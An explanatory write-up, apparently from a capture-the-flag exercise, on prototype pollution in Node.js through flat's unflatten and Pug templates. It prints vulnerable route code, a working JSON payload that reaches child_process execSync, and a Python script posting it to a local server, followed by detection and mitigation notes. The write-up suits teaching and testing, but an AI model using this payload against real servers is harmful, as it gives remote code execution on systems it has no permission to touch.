# **Prototype Pollution**

## **Introduction**

**Prototype Pollution** is a vulnerability that allows an attacker to manipulate the properties of an object’s
prototype. By modifying the object prototype, attackers can inject malicious properties or methods into all instances of
that object type, potentially leading to serious issues like remote code execution (RCE).

## **Understanding Prototype Pollution**

### **What is a Prototype?**

In JavaScript, objects inherit properties and methods from their prototype. Every object in JavaScript has a `__proto__`
property, which links to its prototype. By manipulating the `__proto__` object, it’s possible to inject properties or
methods into all instances of that prototype.

### **How Does Prototype Pollution Occur?**

Prototype Pollution happens when a user-controlled input can modify the prototype of an object using properties such as
`__proto__`, `constructor.prototype`, or `prototype`.

#### **Example of Vulnerable Code:**

```javascript
const { unflatten } = require('flat');

let data = {
    name: "John"
};

// User-controlled input
let payload = {
    "__proto__.admin": true
};

// Unflatten the payload
let obj = unflatten(payload);

// Checking the polluted object
console.log(obj.admin); // true
console.log(data.admin); // true (Polluted)
```

In the above example, the `unflatten` function allows users to insert arbitrary properties into the `__proto__` object,
polluting the prototype.

## **Attack Scenario: Exploiting Prototype Pollution in Node.js**

### **Vulnerable Application**

We analyze a vulnerable Node.js application using **Pug** templating and the **flat** package to process user input.

**Relevant Dependencies (from `package.json`):**

```json
{
    "dependencies": {
        "express": "^4.17.1",
        "flat": "5.0.0",
        "pug": "^3.0.0"
    }
}
```

### **Vulnerable Code Snippet**

```javascript
const { unflatten } = require('flat');
const pug = require('pug');

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

    if (artist.name.includes('Haigh')) {
        return res.json({
            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
        });
    } else {
        return res.json({
            'response': 'Invalid artist name.'
        });
    }
});
```

### **Exploitation**

The `unflatten` function processes user input and is vulnerable to prototype pollution. By sending a malicious payload,
an attacker can inject properties into the `artist` object’s prototype, leading to remote code execution.

#### **Exploit Payload:**

```json
{
    "artist.name": "Haigh",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('$(cat flag*)')"
    }
}
```

In this case, the attacker injects a malicious `block` object into the prototype, which allows the execution of shell
commands on the server.

#### **Exploit Code (Python Script):**

```python
import requests

url = "http://localhost:1337/api/submit"

payload = {
    "artist.name": "Haigh",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('$(cat flag*)')"
    }
}

r = requests.post(url, json=payload)
print(r.json())
```

## **Real-World Impact**

### **Remote Code Execution (RCE)**

In the example provided, the injected `block` property leads to RCE by executing a shell command (`cat flag*`) on the
server. The vulnerable application runs this command, exposing in this case a flag file, but it could be used to execute
any arbitrary code.

## **Detection**

### **Manual Testing**

- Test for prototype pollution vulnerabilities by submitting payloads that target `__proto__` or other prototype-related
  properties.

  Example payload for testing:

  ```json
  {
      "__proto__.polluted": true
  }
  ```

  If the application returns `true` for `polluted`, it is vulnerable.

### **Automated Tools**

- **Burp Suite Extensions**: Use Burp Suite with extensions like **Prototype Pollution Scanner** to automate the
  detection of prototype pollution vulnerabilities.

- **SAST/DAST Tools**: Incorporate static and dynamic application security testing tools into your pipeline to identify
  potential prototype pollution flaws.

## **Conclusion**

Prototype pollution is a critical web vulnerability, especially in JavaScript-based environments like **Node.js**. It
can lead to severe consequences such as remote code execution, privilege escalation, and denial of service. By ensuring
proper input validation, using secure libraries, and disabling unsafe features in templating engines, developers can
mitigate these risks effectively.

## **References**

- [Hacktricks - Pug Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
